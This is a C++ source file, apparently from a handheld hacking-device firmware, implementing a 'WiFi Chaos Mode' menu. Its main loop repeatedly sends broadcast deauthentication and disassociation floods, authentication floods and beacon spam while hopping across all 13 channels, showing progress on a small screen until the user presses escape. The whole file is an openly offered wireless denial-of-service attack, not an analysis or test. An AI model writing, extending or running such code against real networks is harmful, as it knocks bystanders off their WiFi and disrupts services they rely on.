/**
 * @file wifi_chaos.cpp
 * @brief WiFi Chaos Mode - Multi-Vector Attack Loop
 * @author Lele Origin Team
 */

#include "wifi_chaos.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/settings.h"
#include "modules/wifi/ap_info.h"
#include "modules/wifi/iot_deauth.h"
#include "modules/wifi/wifi_advanced_attacks.h"
#include <vector>

void wifi_chaos_menu() {
    tft.fillScreen(TFT_BLACK);
    drawMainBorder();
    tft.setTextColor(TFT_RED, TFT_BLACK);
    tft.setTextSize(2);
    tft.setCursor(10, 40);
    tft.println("CHAOS MODE");
    tft.setTextSize(1);
    tft.setCursor(10, 70);
    tft.println("Deauth + Flood + Sniff");
    tft.println("Scanning targets...");

    // Scan inicial rápido
    wifi_adv_init();
    wifi_adv_scan(2000);

    bool running = true;
    int cycle = 0;

    // Lista de alvos descobertos
    // (Na prática usaria a lista global APInfo, aqui simulamos o acesso)

    while (running && !check(EscPress)) {
        tft.fillRect(0, 90, tftWidth, tftHeight - 90, TFT_BLACK);
        tft.setCursor(10, 100);
        tft.setTextColor(TFT_GREEN, TFT_BLACK);

        // Phase 1: Deauth Storm
        tft.println("[1] sending DEAUTH...");
        uint8_t bcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
        wifi_adv_disassoc_flood(bcast, 1); // 1 packet burst
        wifi_adv_auth_flood(bcast, 1, 0);
        delay(100);

        // Phase 2: Beacon Spam
        tft.println("[2] sending BEACONS...");
        wifi_adv_loud_beacon(1); // 1 burst
        delay(100);

        // Phase 3: Probe/Sniff Check
        tft.println("[3] checking PROBES...");
        // wifi_check_sniffer_buffer(); // (Se houvesse buffer)

        // Visual FX
        cycle++;
        tft.drawRect(5, 35, tftWidth - 10, tftHeight - 40, (cycle % 2 == 0) ? TFT_RED : TFT_MAROON);

        if (check(SelPress)) {
            // Pause
            while (!check(SelPress));
        }

        // Channel Hop
        int ch = (cycle % 13) + 1;
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    }

    wifi_adv_stop_all();
}
